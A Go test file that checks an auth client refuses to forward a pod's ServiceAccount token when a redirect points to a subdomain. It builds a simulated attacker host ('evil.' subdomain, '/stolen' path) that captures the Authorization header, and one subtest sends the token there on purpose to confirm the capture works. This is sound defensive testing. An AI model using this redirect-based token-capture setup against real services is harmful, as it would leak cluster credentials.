package authn

import (
	"context"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// THE CREDENTIAL HERE IS THE POD'S PROJECTED SERVICEACCOUNT TOKEN (#401).
//
// It was presented on a plain &http.Client{Timeout: ...} with no CheckRedirect, on the assumption that
// net/http's own Authorization strip covered a redirect. It does not: the strip PERMITS a hop to a
// SUBDOMAIN of the origin host and ignores the port, which client.go states as a deliberate design
// decision ("Permit sending auth/cookie headers from \"foo.com\" to \"sub.foo.com\"") and which falls out
// of comparing url.Hostname(). So no Go release will close it.
//
// WHY THIS TEST IS SHAPED THE WAY IT IS, rather than asserting CheckRedirect != nil. A nil-check passes
// for a CheckRedirect that PERMITS, and it exercises no request at all. The sibling guard in jqmodule
// has exactly that shape. This one drives a real redirect and reads the DESTINATION's record.
//
// AND THE DESTINATION PROVES IT CAN DETECT A HEADER BEFORE ITS SILENCE IS BELIEVED. "The destination saw
// nothing" is the PASSING answer here, so a destination that cannot see headers at all would report
// success -- a signal whose failure to apply is indistinguishable from its applying. The first subtest
// therefore establishes the instrument, and only then does the second trust it.
func TestTheServiceAccountTokenDoesNotFollowARedirect(t *testing.T) {
	const token = "SA-TOKEN-SENTINEL"
	tokenPath := filepath.Join(t.TempDir(), "token")
	if err := os.WriteFile(tokenPath, []byte(token), 0o600); err != nil {
		t.Fatalf("writing the fake projected token: %v", err)
	}

	var destinationSaw string
	destination := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		destinationSaw = r.Header.Get("Authorization")
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"token":"stolen"}`))
	}))
	defer destination.Close()
	_, destPort, _ := net.SplitHostPort(strings.TrimPrefix(destination.URL, "http://"))

	// origin answers 302 to a SUBDOMAIN of its own hostname -- the shape net/http permits. Both names
	// resolve to 127.0.0.1 through the dialer below, so only the NAME differs, which is what net/http
	// keys on.
	const originHost = "authn.krateo.test"
	const destHost = "evil." + originHost
	var originSaw string
	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		originSaw = r.Header.Get("Authorization")
		http.Redirect(w, r, "http://"+destHost+":"+destPort+"/stolen", http.StatusFound)
	}))
	defer origin.Close()
	_, originPort, _ := net.SplitHostPort(strings.TrimPrefix(origin.URL, "http://"))

	// anyHost sends every request to 127.0.0.1 on the port the URL names, so arbitrary hostnames are
	// reachable without touching /etc/hosts. net/http decides the header question on the NAME, before
	// resolution, so this affects reachability only.
	anyHost := func() *http.Transport {
		return &http.Transport{DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			_, p, _ := net.SplitHostPort(addr)
			var d net.Dialer
			return d.DialContext(ctx, network, "127.0.0.1:"+p)
		}}
	}

	t.Run("PREMISE: the destination can detect a credential it is sent", func(t *testing.T) {
		destinationSaw = ""
		req, err := http.NewRequest(http.MethodPost, "http://"+destHost+":"+destPort+"/stolen", nil)
		if err != nil {
			t.Fatalf("building the premise request: %v", err)
		}
		req.Header.Set("Authorization", "Bearer "+token)
		resp, err := (&http.Client{Transport: anyHost()}).Do(req)
		if err != nil {
			t.Fatalf("the premise request must reach the destination: %v", err)
		}
		_ = resp.Body.Close()
		if !strings.Contains(destinationSaw, token) {
			t.Fatalf("the destination did not record a credential it was sent directly (saw %q). Every "+
				"assertion below reads its silence as proof the token did not travel, so an instrument "+
				"that cannot see a header would report success", destinationSaw)
		}
	})

	t.Run("the token does not reach a subdomain of the configured host", func(t *testing.T) {
		destinationSaw, originSaw = "", ""
		c := New("http://"+originHost+":"+originPort, tokenPath).
			WithHTTPClient(&http.Client{Transport: anyHost()})

		_, _, err := c.exchange(context.Background())
		if err == nil {
			t.Fatal("the exchange must fail: a 302 from authn is never legitimate, so following it " +
				"silently is the defect and succeeding would mean the hop was taken")
		}
		if !strings.Contains(err.Error(), "redirects are not allowed") {
			t.Errorf("error = %q, want it to name the redirect refusal. Some other failure would make "+
				"the assertion below pass for the wrong reason", err.Error())
		}

		// GROUND TRUTH, from the server rather than from the client's own report.
		if strings.Contains(destinationSaw, token) {
			t.Errorf("the ServiceAccount token reached %s, a host the operator never configured. "+
				"net/http's strip does not cover a subdomain hop and never will", destHost)
		}
		if destinationSaw != "" {
			t.Errorf("the destination was contacted at all (saw Authorization=%q); the hop must be "+
				"refused before any request leaves", destinationSaw)
		}
		// And the ORIGIN must have received it, or the test proves only that nothing was sent anywhere.
		if !strings.Contains(originSaw, token) {
			t.Errorf("the configured host never received the credential (saw %q), so this case did not "+
				"exercise a credentialed request and its conclusion is empty", originSaw)
		}
	})
}

// The redirect policy belongs to the package, not to the caller: WithHTTPClient exists to swap the
// TRANSPORT for a test server, and a caller handing in a bare client must not silently lose the
// guarantee. Asserted on the function rather than on a request, because what matters is that the field
// is populated on whatever was passed in.
func TestWithHTTPClientReinstallsTheRedirectPolicy(t *testing.T) {
	supplied := &http.Client{} // no CheckRedirect, as any caller's bare client would be
	c := New("http://authn.invalid", filepath.Join(t.TempDir(), "absent")).WithHTTPClient(supplied)
	if c.httpClient.CheckRedirect == nil {
		t.Fatal("WithHTTPClient left CheckRedirect nil, so a caller-supplied client follows redirects " +
			"and presents the ServiceAccount token on every hop (#401)")
	}
	if err := c.httpClient.CheckRedirect(nil, nil); err == nil {
		t.Error("the installed CheckRedirect permitted a hop. A non-nil CheckRedirect that returns nil " +
			"is indistinguishable from none, which is why this asserts the behaviour and not the field")
	}
	if New("http://authn.invalid", "").httpClient.CheckRedirect == nil {
		t.Error("New built a client with no redirect policy; WithHTTPClient is the override, not the " +
			"only place the guarantee exists")
	}
}
